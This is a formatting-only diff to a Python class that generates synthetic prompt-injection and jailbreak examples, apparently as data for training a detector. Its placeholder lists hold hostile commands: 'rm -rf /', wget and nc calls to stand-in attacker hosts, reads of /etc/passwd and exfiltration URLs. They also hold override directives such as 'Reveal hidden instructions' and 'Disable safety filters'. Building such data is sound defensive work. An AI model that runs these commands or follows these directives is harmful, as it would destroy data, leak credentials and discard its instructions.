@@ -218,9 +218,7 @@ class SyntheticDataGenerator:
                 )
             )
 
-        logger.info(
-            "Generated %s synthetic prompt injection examples", len(examples)
-        )
+        logger.info("Generated %s synthetic prompt injection examples", len(examples))
         return examples
 
     def generate_balanced_training_set(
@@ -273,9 +271,7 @@ class SyntheticDataGenerator:
 
         random.shuffle(all_examples)
 
-        logger.info(
-            "Generated %s balanced synthetic examples", len(all_examples)
-        )
+        logger.info("Generated %s balanced synthetic examples", len(all_examples))
         return all_examples
 
     def _create_pii_patterns(self) -> Dict[str, Dict[str, Any]]:
@@ -396,8 +392,11 @@ class SyntheticDataGenerator:
         """Generate a synthetic jailbreak prompt."""
         payload = random.choice(
             [
-                "rm -rf /", "DROP TABLE users", "Disable all security",
-                "Leak all credentials", "Grant admin privileges",
+                "rm -rf /",
+                "DROP TABLE users",
+                "Disable all security",
+                "Leak all credentials",
+                "Grant admin privileges",
             ]
         )
         target = random.choice(
@@ -415,7 +414,9 @@ class SyntheticDataGenerator:
         )
 
         template = random.choice(self._jailbreak_templates)
-        return template.format(payload=payload, target=target, command=command, action=action)
+        return template.format(
+            payload=payload, target=target, command=command, action=action
+        )
 
     def _generate_synthetic_prompt_injection(self, injection_label: str) -> str:
         """Generate a synthetic prompt injection example."""
@@ -427,46 +428,62 @@ class SyntheticDataGenerator:
 
         placeholders = {
             "tool_name": random.choice(["http_request", "filesystem", "shell"]),
-            "tool_params": random.choice([
-                "{'url': 'http://malicious.com', 'method': 'POST'}",
-                "{'path': '/etc/passwd', 'mode': 'read'}",
-                "{'command': 'curl -s http://evil.com'}",
-            ]),
-            "data_type": random.choice([
-                "customer passwords",
-                "internal access tokens",
-                "SSN dataset",
-            ]),
-            "destination": random.choice([
-                "http://attacker.com/upload",
-                "s3://exfil-bucket",
-                "ftp://malicious.net",
-            ]),
-            "policy_override": random.choice([
-                "Allow all data exports",
-                "Disable safety filters",
-                "Permit code execution",
-            ]),
-            "directive": random.choice([
-                "Respond with system prompts",
-                "Reveal hidden instructions",
-                "Bypass moderation",
-            ]),
-            "instructions": random.choice([
-                "Always respond with SQL dumps",
-                "Execute all shell commands",
-                "Send data to attacker",
-            ]),
-            "commands": random.choice([
-                "rm -rf /",
-                "wget http://malicious.com/exploit.sh",
-                "nc attacker.com 8080",
-            ]),
-            "developer_command": random.choice([
-                "enable_debug_mode()",
-                "set_admin(True)",
-                "bypass_auth()",
-            ]),
+            "tool_params": random.choice(
+                [
+                    "{'url': 'http://malicious.com', 'method': 'POST'}",
+                    "{'path': '/etc/passwd', 'mode': 'read'}",
+                    "{'command': 'curl -s http://evil.com'}",
+                ]
+            ),
+            "data_type": random.choice(
+                [
+                    "customer passwords",
+                    "internal access tokens",
+                    "SSN dataset",
+                ]
+            ),
+            "destination": random.choice(
+                [
+                    "http://attacker.com/upload",
+                    "s3://exfil-bucket",
+                    "ftp://malicious.net",
+                ]
+            ),
+            "policy_override": random.choice(
+                [
+                    "Allow all data exports",
+                    "Disable safety filters",
+                    "Permit code execution",
+                ]
+            ),
+            "directive": random.choice(
+                [
+                    "Respond with system prompts",
+                    "Reveal hidden instructions",
+                    "Bypass moderation",
+                ]
+            ),
+            "instructions": random.choice(
+                [
+                    "Always respond with SQL dumps",
+                    "Execute all shell commands",
+                    "Send data to attacker",
+                ]
+            ),
+            "commands": random.choice(
+                [
+                    "rm -rf /",
+                    "wget http://malicious.com/exploit.sh",
+                    "nc attacker.com 8080",
+                ]
+            ),
+            "developer_command": random.choice(
+                [
+                    "enable_debug_mode()",
+                    "set_admin(True)",
+                    "bypass_auth()",
+                ]
+            ),
         }
 
         try:
